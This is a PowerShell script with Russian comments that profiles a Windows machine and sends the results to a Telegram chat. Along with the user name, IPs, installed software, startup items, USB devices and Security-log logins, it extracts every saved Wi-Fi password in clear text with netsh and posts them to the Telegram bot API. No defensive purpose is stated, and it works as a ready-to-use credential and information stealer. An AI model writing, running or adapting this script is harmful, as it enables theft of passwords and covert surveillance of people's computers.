param(
    [string]$botToken,
    [string]$chatId
)

# === Получение температуры CPU ===
function Get-CPUTemp {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if (-not $isAdmin) {
            return "❌ Недостаточно прав"
        }

        $temp = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" | ForEach-Object {
            ($_.CurrentTemperature - 2732) / 10.0
        } | Select-Object -First 1

        if ($temp) {
            return "🔥 {0:N1} °C" -f $temp
        } else {
            return "❌ Нет данных"
        }
    } catch {
        return "❌ Не удалось получить"
    }
}

# === Сбор основной информации ===
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeFormatted = ((Get-Date) - $uptime).ToString("dd\.hh\:mm\:ss")
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" } | Select-Object -First 1 -ExpandProperty IPAddress)
try {
    $externalIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
} catch {
    $externalIP = "❌ Не удалось получить"
}
$cpuTemp = Get-CPUTemp

# === Установленные программы ===
$appList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName } |
    Select-Object -First 10 DisplayName, DisplayVersion

$apps = ""
foreach ($app in $appList) {
    $version = $app.DisplayVersion
    $apps += if ($version) { "📦 $($app.DisplayName) ($version)`n" } else { "📦 $($app.DisplayName)`n" }
}

# === Сетевые параметры ===
$networkLines = ipconfig /all | Select-String "IPv4|DNS|Default Gateway"
$network = ""
foreach ($line in $networkLines) {
    if ($line.Line -match '\d+\.\d+\.\d+\.\d+|\S+\.\S+') {
        $network += "🌐 $($line.Line)`n"
    }
}

# === Автозагрузка ===
$startupItems = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -First 10 Name, Command
$startup = ""
foreach ($item in $startupItems) {
    $startup += "🚀 $($item.Name): $($item.Command)`n"
}

# === USB-устройства ===
$usbList = Get-WmiObject Win32_USBControllerDevice | ForEach-Object {
    [wmi]($_.Dependent)
} | Select-Object -First 5 Description

$usbDevices = ""
foreach ($usb in $usbList) {
    $usbDevices += "🔌 $($usb.Description)`n"
}

# === Логи входа ===
$loginList = Get-EventLog -LogName Security -InstanceId 4624 -Newest 5
$logins = ""
foreach ($entry in $loginList) {
    $logins += "🔐 $($entry.TimeGenerated): $($entry.ReplacementStrings[5])`n"
}

# === Получение паролей Wi-Fi ===
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile|Все профили пользователей" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiPasswords = ""
foreach ($profile in $wifiProfiles) {
    $wifiDetails = netsh wlan show profile name="$profile" key=clear
    $wifiPassword = ($wifiDetails | Select-String "Key Content|Содержимое ключа" | ForEach-Object { ($_ -split ":")[1].Trim() })
    if ($wifiPassword) {
        $wifiPasswords += "🔑 <i>$profile</i>: $wifiPassword`n"
    }
}

# === Собираем полный текст сообщения с эмодзи ===
$message = @"
<i>🖥️ Информация о ПК:</i>

<i>👤 Пользователь:</i> $userName  
<i>💻 Компьютер:</i> $compName  
<i>⏱️ Аптайм:</i> $uptimeFormatted  
<i>🌐 Локальный IP:</i> $localIP  
<i>📡 Внешний IP:</i> $externalIP  
<i>🔥 Температура CPU:</i> $cpuTemp

---

<i>📦 Установленные программы:</i>  
$apps

---

<i>🌐 Сетевые параметры:</i>  
$network

---

<i>🚀 Автозагрузка:</i>  
$startup

---

<i>🔌 Подключённые USB-устройства:</i>  
$usbDevices

---

<i>🔐 Последние входы в систему:</i>  
$logins

---

<i>💾 Сохранённые Wi-Fi сети и пароли:</i>  
$wifiPasswords
"@

# === Отправка в Telegram ===
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
    -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{
        chat_id = $chatId
        text = $message
        parse_mode = "HTML"
    }

Write-Host "Информация успешно отправлена в Telegram!"
